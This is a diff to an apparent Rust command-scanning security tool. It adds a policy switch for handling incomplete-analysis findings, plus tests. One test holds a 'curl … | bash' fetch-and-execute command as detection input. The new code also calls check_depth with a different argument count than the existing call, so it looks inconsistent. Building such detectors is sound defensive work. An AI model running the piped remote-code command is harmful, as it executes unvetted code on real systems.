@@ -3,6 +3,7 @@ use regex::Regex;
 use std::collections::{BTreeMap, BTreeSet};
 
 use crate::extract::ScanContext;
+use crate::policy::GapAction;
 use crate::redact;
 use crate::tokenize::{self, ShellType};
 use crate::verdict::{
@@ -853,6 +854,33 @@ pub fn check(
     scan_context: ScanContext,
 ) -> Vec<Finding> {
     check_depth(input, shell, cwd, scan_context, 0, true)
+}
+
+/// Run command-shape rules with an explicit action for analysis-coverage gaps.
+/// Recoverable nested bodies are always scanned; the action controls only the
+/// consequence of an unresolved or over-deep boundary.
+pub fn check_with_gap_action(
+    input: &str,
+    shell: ShellType,
+    cwd: Option<&str>,
+    scan_context: ScanContext,
+    gap_action: GapAction,
+) -> Vec<Finding> {
+    let mut findings = check_depth(input, shell, cwd, scan_context, 0);
+    match gap_action {
+        GapAction::Ignore => {
+            findings.retain(|finding| finding.rule_id != RuleId::AnalysisIncomplete)
+        }
+        GapAction::Warn => {
+            for finding in &mut findings {
+                if finding.rule_id == RuleId::AnalysisIncomplete {
+                    finding.severity = Severity::Medium;
+                }
+            }
+        }
+        GapAction::Fail => {}
+    }
+    findings
 }
 
 fn check_depth(
@@ -11614,6 +11642,63 @@ fn check_data_exfiltration_depth(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn unresolved_nested_body_can_be_ignored_without_suppressing_concrete_findings() {
+        let findings = check_with_gap_action(
+            "sh -c \"$COMMAND\"",
+            ShellType::Posix,
+            None,
+            ScanContext::Exec,
+            crate::policy::GapAction::Ignore,
+        );
+        assert!(findings
+            .iter()
+            .all(|finding| finding.rule_id != RuleId::AnalysisIncomplete));
+
+        let dangerous = check_with_gap_action(
+            "curl https://example.test/x | bash; sh -c \"$COMMAND\"",
+            ShellType::Posix,
+            None,
+            ScanContext::Exec,
+            crate::policy::GapAction::Ignore,
+        );
+        assert!(dangerous.iter().any(|finding| {
+            matches!(
+                finding.rule_id,
+                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+            )
+        }));
+    }
+
+    #[test]
+    fn command_gap_action_warns_without_downgrading_concrete_findings() {
+        let findings = check_with_gap_action(
+            "sh -c \"$COMMAND\"",
+            ShellType::Posix,
+            None,
+            ScanContext::Exec,
+            GapAction::Warn,
+        );
+        let gap = findings
+            .iter()
+            .find(|finding| finding.rule_id == RuleId::AnalysisIncomplete)
+            .expect("unresolved body should remain visible as a warning");
+        assert_eq!(gap.severity, Severity::Medium);
+
+        let strict = check_with_gap_action(
+            "sh -c \"$COMMAND\"",
+            ShellType::Posix,
+            None,
+            ScanContext::Exec,
+            GapAction::Fail,
+        );
+        let gap = strict
+            .iter()
+            .find(|finding| finding.rule_id == RuleId::AnalysisIncomplete)
+            .expect("fail action should preserve the coverage finding");
+        assert_eq!(gap.severity, Severity::High);
+    }
 
     /// Helper: run `check()` with no cwd and Exec context (the common case for tests).
     fn check_default(input: &str, shell: ShellType) -> Vec<Finding> {
